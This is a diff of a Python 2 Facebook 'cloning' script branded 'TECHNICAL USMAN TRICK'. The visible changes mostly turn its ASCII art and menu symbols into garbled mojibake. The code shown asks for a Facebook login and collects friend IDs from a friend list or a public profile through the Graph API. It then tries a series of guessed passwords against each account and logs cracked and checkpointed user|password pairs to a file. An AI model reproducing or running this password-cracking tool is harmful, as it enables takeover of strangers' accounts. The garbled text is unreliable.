@@ -55,18 +55,18 @@ logo ="""
 ................................... (((--*--)))
 .......................... (- ,, -)  
 ..................... (- ,, -)
-................ (�`v��)
-..............(�`()��)
-...,�*�(.^.) 
-.....(�`v��) �./�
-..(�`()��)/�.�*
-... (.^.)/����(�`v��)
-.....�*�)//*��(�`()��)
-......�)//�`*��`(.^.) 
-(�`����)
- `�., (�`����)
-(�\v/�) `�.,.�
-(�><�)   
+................ (¯`v´¯)
+..............(¯`()´¯)
+...,•*´(.^.) 
+.....(¯`v´¯) •./¸
+..(¯`()´¯)/¸.•*
+... (.^.)/•´¨¯(¯`v´¯)
+.....•*´)//*´¯(¯`()´¯)
+......´)//¯`*´¯`(.^.) 
+(¯`••´¯)
+ `•., (¯`••´¯)
+(¯\v/¯) `•.,.•
+(¯><¯)   
 (/\) ___
 ______________
 ____________
@@ -87,25 +87,25 @@ _________................
 __________.......... 
 ___________..... 
 ____________......... 
-__________(�``:���) ......
-________(� `�.\\|/.���)........ 
-________(� `�. .���)..... 
-______(.��/|\\`�.) ........ 
+__________(¯``:´´¯) ......
+________(¯ `•.\\|/.•´¯)........ 
+________(¯ `•. .•´¯)..... 
+______(.•´/|\\`•.) ........ 
 ________(..:...) ............. 
-___ '�___ ................. 
-___ '�___.................... 
+___ '¯___ ................. 
+___ '¯___.................... 
 ____________..................... 
 __________.......................... 
-________\'�.................................
-_ '�
-_ '�
+________\'¯.................................
+_ '¯
+_ '¯
 _  + TECHNICAL USMAN TRICK
-_ '�_�� ........USMAN
+_ '¯_¸¸ ........USMAN
 _
- (�`:��)
-(�`�.\\|/.���)
-(� `�.  .�� �)
-(.��/|\\`�._)
+ (¯`:´¯)
+(¯`•.\\|/.•´¯)
+(¯ `•.  .•´ ¯)
+(.•´/|\\`•._)
 _( .:.)
 _____
 ______
@@ -115,13 +115,13 @@ _____
 ____
                     
 \x1b[1;97m--------------------------------------------------------------
-\x1b[1;94m➣  YouTube  : TECHNICAL USMAN TRICK
-\x1b[1;94m➣  Facebook : Usman Shehbaz
-\x1b[1;94m➣  Note     : COMMANDS MAKER TECHNICAL USMAN TRICK
-\x1b[1;94m➣  Github   : https://github.com/Usman5454
-\x1b[1;94m➣  Whatsapp : 
-\x1b[1;94m➣  Note     : Having Problem? Contact ME ON INSTAGRAM
-\x1b[1;94m➣  Disclamiar : This Is For Educational Purpose Only.
+\x1b[1;94mâž£  YouTube  : TECHNICAL USMAN TRICK
+\x1b[1;94mâž£  Facebook : Usman Shehbaz
+\x1b[1;94mâž£  Note     : COMMANDS MAKER TECHNICAL USMAN TRICK
+\x1b[1;94mâž£  Github   : https://github.com/Usman5454
+\x1b[1;94mâž£  Whatsapp : 
+\x1b[1;94mâž£  Note     : Having Problem? Contact ME ON INSTAGRAM
+\x1b[1;94mâž£  Disclamiar : This Is For Educational Purpose Only.
 \x1b[1;97m--------------------------------------------------------------"""
 def tik():
 	titik = ['.   ','..  ','... ']
@@ -168,14 +168,14 @@ def login():
 		print logo
      	
 		
-		jalan(' \033[1;97m   ✧ \033[1;97mWarning: \033[1;97mUse a New Account To Login' )
-		jalan(' \033[1;97m   ✧ \033[1;97m👉 : \033[1;97mUsman Tech ' ) 
+		jalan(' \033[1;97m   âœ§ \033[1;97mWarning: \033[1;97mUse a New Account To Login' )
+		jalan(' \033[1;97m   âœ§ \033[1;97mðŸ‘‰ : \033[1;97mUsman Tech ' ) 
 		
 		print('	' )
-		print('      \033[1;97m      ✧ \x1b[1;97mLogin With Facebook\x1b[1;97m ✧')
+		print('      \033[1;97m      âœ§ \x1b[1;97mLogin With Facebook\x1b[1;97m âœ§')
 		print('	' )
-		id = raw_input('\033[1;97m✧ \x1b[1;97mID/Email\x1b[1;97m: \x1b[1;97m')
-		pwd = raw_input('\033[1;97m✧ \x1b[1;97mPassword\x1b[1;97m: \x1b[1;97m')
+		id = raw_input('\033[1;97mâœ§ \x1b[1;97mID/Email\x1b[1;97m: \x1b[1;97m')
+		pwd = raw_input('\033[1;97mâœ§ \x1b[1;97mPassword\x1b[1;97m: \x1b[1;97m')
 		try:
 			br.open('https://m.facebook.com')
 		except mechanize.URLError:
@@ -246,21 +246,21 @@ def menu():
 		keluar()
 	os.system("clear") #Dev:usman
 	print logo
-	print "  \033[1;97m        ⚡ \033[1;97mLogged in User Info\033[1;97m ⚡"
+	print "  \033[1;97m        âš¡ \033[1;97mLogged in User Info\033[1;97m âš¡"
 	print "	   \033[1;97m Name\033[1;97m:\033[1;97m"+nama+"\033[1;97m               "
 	print "	   \033[1;97m ID\033[1;97m:\033[1;97m"+id+"\x1b[1;97m              "
 	
 	print "\033[1;97m---------------------------------------------------------"
 		
-	print "\033[1;97m✧\033[1;97m.\033[1;97m1.\x1b[1;97m Start Cloning..."
+	print "\033[1;97mâœ§\033[1;97m.\033[1;97m1.\x1b[1;97m Start Cloning..."
       
         
-        print "\033[1;97m✧\033[1;97m.\033[1;97m2.\033[1;97m Follow Me On YouTube For Help"
-        print "\033[1;97m✧\033[1;97m.\033[1;97m0.\033[1;97m Logout            "
+        print "\033[1;97mâœ§\033[1;97m.\033[1;97m2.\033[1;97m Follow Me On YouTube For Help"
+        print "\033[1;97mâœ§\033[1;97m.\033[1;97m0.\033[1;97m Logout            "
         hop()
 
 def hop():
-	hack = raw_input("\n\033[1;97mChoose Option ≻ \033[1;97m")
+	hack = raw_input("\n\033[1;97mChoose Option â‰» \033[1;97m")
 	if hack =="":
 		print "\x1b[1;97mFill in correctly"
 		hop()
@@ -289,13 +289,13 @@ def super():
 		login()
 	os.system('clear')
 	print logo
-	print "\033[1;97m✧ \033[1;97m1.\x1b[1;97mCrack From Friend List."
-	print "\033[1;97m✧ \033[1;97m2.\x1b[1;97mCrack From Public ID."
-	print "\033[1;97m✧ \033[1;97m0.\033[1;97mBack."
+	print "\033[1;97mâœ§ \033[1;97m1.\x1b[1;97mCrack From Friend List."
+	print "\033[1;97mâœ§ \033[1;97m2.\x1b[1;97mCrack From Public ID."
+	print "\033[1;97mâœ§ \033[1;97m0.\033[1;97mBack."
 	pilih_super()
 
 def pilih_super():
-	peak = raw_input("\n\033[1;97mChoose Option ≻ \033[1;97m")
+	peak = raw_input("\n\033[1;97mChoose Option â‰» \033[1;97m")
 	if peak =="":
 		print "\x1b[1;97mFill in correctly"
 		pilih_super()
@@ -303,7 +303,7 @@ def pilih_super():
 		os.system('clear')
 		print logo
 		print "\033[1;97m Please Wait"
-		jalan('\033[1;97m[✔] Getting IDs \033[1;97m...')
+		jalan('\033[1;97m[âœ”] Getting IDs \033[1;97m...')
 		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
 		z = json.loads(r.text)
 		for s in z['data']:
@@ -311,17 +311,17 @@ def pilih_super():
 	elif peak =="2":
 		os.system('clear')
 		print logo
-		idt = raw_input("\033[1;97m≻\033[1;97mLink ID\033[1;37m: \033[1;97m")
+		idt = raw_input("\033[1;97mâ‰»\033[1;97mLink ID\033[1;37m: \033[1;97m")
 		
 		try:
 			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 			op = json.loads(jok.text)
-			print"\033[1;97m[✔] Name\033[1;97m:\033[1;97m "+op["name"]
+			print"\033[1;97m[âœ”] Name\033[1;97m:\033[1;97m "+op["name"]
 		except KeyError:
 			print"\x1b[1;97mID Not Found!"
 			raw_input("\n\033[1;97m[\033[1;97mBack\033[1;97m]")
 			super()
-		print"\033[1;97m[✔] Getting IDs..."
+		print"\033[1;97m[âœ”] Getting IDs..."
 		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
 		z = json.loads(r.text)
 		for i in z['data']:
@@ -333,10 +333,10 @@ def pilih_super():
 		print "\x1b[1;97mFill in correctly"
 		pilih_super()
 	
-	print "\033[1;97m[✔] Total Friends \033[1;97m: \033[1;97m"+str(len(id))
+	print "\033[1;97m[âœ”] Total Friends \033[1;97m: \033[1;97m"+str(len(id))
 	titik = ['.   ','..  ','... ']
 	for o in titik:
-		print("\r\033[1;97m[✔] Cloning Started\033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
+		print("\r\033[1;97m[âœ”] Cloning Started\033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
         print"""
 [!] To Stop Process Press CTRL Then Z
 
@@ -358,11 +358,11 @@ def pilih_super():
 			if 'access_token' in q:
 				x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
 				z = json.loads(x.text)
-				print '\x1b[1;32mSuccessful\x1b[1;32m \x1b[1;32m¦\x1b[1;32m ' + user + ' \x1b[1;32m¦\x1b[1;32m ' + pass1	
+				print '\x1b[1;32mSuccessful\x1b[1;32m \x1b[1;32mÂ¦\x1b[1;32m ' + user + ' \x1b[1;32mÂ¦\x1b[1;32m ' + pass1	
 				oks.append(user+pass1)
 			else:
 				if 'www.facebook.com' in q["error_msg"]:
-					print '\x1b[1;97mCheckpoint\x1b[1;97m \x1b[1;97m¦\x1b[1;97m ' + user + ' \x1b[1;97m¦\x1b[1;97m ' + pass1	
+					print '\x1b[1;97mCheckpoint\x1b[1;97m \x1b[1;97mÂ¦\x1b[1;97m ' + user + ' \x1b[1;97mÂ¦\x1b[1;97m ' + pass1	
 					cek = open("out/checkpoint.txt", "a")
 					cek.write(user+"|"+pass1+"\n")
 					cek.close()
@@ -374,11 +374,11 @@ def pilih_super():
 					if 'access_token' in q:
 						x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
 						z = json.loads(x.text)
-						print '\x1b[1;32mSuccessful\x1b[1;32m \x1b[1;32m¦\x1b[1;32m ' + user + ' \x1b[1;32m¦\x1b[1;32m ' + pass2	
+						print '\x1b[1;32mSuccessful\x1b[1;32m \x1b[1;32mÂ¦\x1b[1;32m ' + user + ' \x1b[1;32mÂ¦\x1b[1;32m ' + pass2	
 						oks.append(user+pass2)
 					else:
 						if 'www.facebook.com' in q["error_msg"]:
-							print '\x1b[1;97mCheckpoint\x1b[1;97m \x1b[1;97m¦\x1b[1;97m ' + user + ' \x1b[1;97m¦\x1b[1;97m ' + pass2	
+							print '\x1b[1;97mCheckpoint\x1b[1;97m \x1b[1;97mÂ¦\x1b[1;97m ' + user + ' \x1b[1;97mÂ¦\x1b[1;97m ' + pass2	
 							cek = open("out/checkpoint.txt", "a")
 							cek.write(user+"|"+pass2+"\n")
 							cek.close()
@@ -390,11 +390,11 @@ def pilih_super():
 							if 'access_token' in q:
 								x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
 								z = json.loads(x.text)
-								print '\x1b[1;32mSuccessful\x1b[1;32m \x1b[1;32m¦\x1b[1;32m ' + user + ' \x1b[1;32m¦\x1b[1;32m ' + pass3	
+								print '\x1b[1;32mSuccessful\x1b[1;32m \x1b[1;32mÂ¦\x1b[1;32m ' + user + ' \x1b[1;32mÂ¦\x1b[1;32m ' + pass3	
 								oks.append(user+pass3)
 							else:
 								if 'www.facebook.com' in q["error_msg"]:
-									print '\x1b[1;97mCheckpoint\x1b[1;97m \x1b[1;97m¦\x1b[1;97m ' + user + ' \x1b[1;97m¦\x1b[1;97m ' + pass3	
+									print '\x1b[1;97mCheckpoint\x1b[1;97m \x1b[1;97mÂ¦\x1b[1;97m ' + user + ' \x1b[1;97mÂ¦\x1b[1;97m ' + pass3	
 									cek = open("out/checkpoint.txt", "a")
 									cek.write(user+"|"+pass3+"\n")
 									cek.close()
@@ -406,11 +406,11 @@ def pilih_super():
 									if 'access_token' in q:
 										x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
 										z = json.loads(x.text)
-										print '\x1b[1;32mSuccessful\x1b[1;32m \x1b[1;32m¦\x1b[1;32m ' + user + ' \x1b[1;32m¦\x1b[1;32m ' + pass4	
+										print '\x1b[1;32mSuccessful\x1b[1;32m \x1b[1;32mÂ¦\x1b[1;32m ' + user + ' \x1b[1;32mÂ¦\x1b[1;32m ' + pass4	
 										oks.append(user+pass4)
 									else:
 										if 'www.facebook.com' in q["error_msg"]:
-											print '\x1b[1;97mCheckpoint\x1b[1;97m \x1b[1;97m¦\x1b[1;97m ' + user + ' \x1b[1;97m¦\x1b[1;97m ' + pass4	
+											print '\x1b[1;97mCheckpoint\x1b[1;97m \x1b[1;97mÂ¦\x1b[1;97m ' + user + ' \x1b[1;97mÂ¦\x1b[1;97m ' + pass4	
 											cek = open("out/Checkpoint.txt", "a")
 											cek.write(user+"|"+pass4+"\n")
 											cek.close()
@@ -422,11 +422,11 @@ def pilih_super():
 											if 'access_token' in q:
 												x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
 												z = json.loads(x.text)
-												print '\x1b[1;32mSuccessful\x1b[1;32m \x1b[1;32m¦\x1b[1;32m ' + user + ' \x1b[1;32m¦\x1b[1;32m ' + pass5	
+												print '\x1b[1;32mSuccessful\x1b[1;32m \x1b[1;32mÂ¦\x1b[1;32m ' + user + ' \x1b[1;32mÂ¦\x1b[1;32m ' + pass5	
 												oks.append(user+pass5)
 											else:
 												if 'www.facebook.com' in q["error_msg"]:
-													print '\x1b[1;97mCheckpoint\x1b[1;97m \x1b[1;97m¦\x1b[1;97m ' + user + ' \x1b[1;97m¦\x1b[1;97m ' + pass5	
+													print '\x1b[1;97mCheckpoint\x1b[1;97m \x1b[1;97mÂ¦\x1b[1;97m ' + user + ' \x1b[1;97mÂ¦\x1b[1;97m ' + pass5	
 													cek = open("out/checkpoint.txt", "a")
 													cek.write(user+"|"+pass5+"\n")
 													cek.close()
@@ -438,11 +438,11 @@ def pilih_super():
 													if 'access_token' in q:
 														x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
 														z = json.loads(x.text)
-														print '\x1b[1;32mSuccessful\x1b[1;32m \x1b[1;32m¦\x1b[1;32m ' + user + ' \x1b[1;32m¦\x1b[1;32m ' + pass6	
+														print '\x1b[1;32mSuccessful\x1b[1;32m \x1b[1;32mÂ¦\x1b[1;32m ' + user + ' \x1b[1;32mÂ¦\x1b[1;32m ' + pass6	
 														oks.append(user+pass6)
 													else:
 														if 'www.facebook.com' in q["error_msg"]:
-															print '\x1b[1;97mCheckpoint\x1b[1;97m \x1b[1;97m¦\x1b[1;97m ' + user + ' \x1b[1;97m¦\x1b[1;97m ' + pass6	
+															print '\x1b[1;97mCheckpoint\x1b[1;97m \x1b[1;97mÂ¦\x1b[1;97m ' + user + ' \x1b[1;97mÂ¦\x1b[1;97m ' + pass6	
 															cek = open("out/checkpoint.txt", "a")
 															cek.write(user+"|"+pass6+"\n")
 															cek.close()
@@ -454,11 +454,11 @@ def pilih_super():
 															if 'access_token' in q:
 																x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
 																z = json.loads(x.text)
-																print '\x1b[1;32mSuccessful\x1b[1;32m \x1b[1;32m¦\x1b[1;32m ' + user + ' \x1b[1;32m¦\x1b[1;32m ' + pass7	
+																print '\x1b[1;32mSuccessful\x1b[1;32m \x1b[1;32mÂ¦\x1b[1;32m ' + user + ' \x1b[1;32mÂ¦\x1b[1;32m ' + pass7	
 																oks.append(user+pass7)
 															else:
 																if 'www.facebook.com' in q["error_msg"]:
-																	print '\x1b[1;97mCheckpoint\x1b[1;97m \x1b[1;97m¦\x1b[1;97m ' + user + ' \x1b[1;97m¦\x1b[1;97m ' + pass7	
+																	print '\x1b[1;97mCheckpoint\x1b[1;97m \x1b[1;97mÂ¦\x1b[1;97m ' + user + ' \x1b[1;97mÂ¦\x1b[1;97m ' + pass7	
 																	cek = open("out/checkpoint.txt", "a")
                                                                                                                                         cek.write(user+"|"+pass7+"\n")
 																	cek.close()
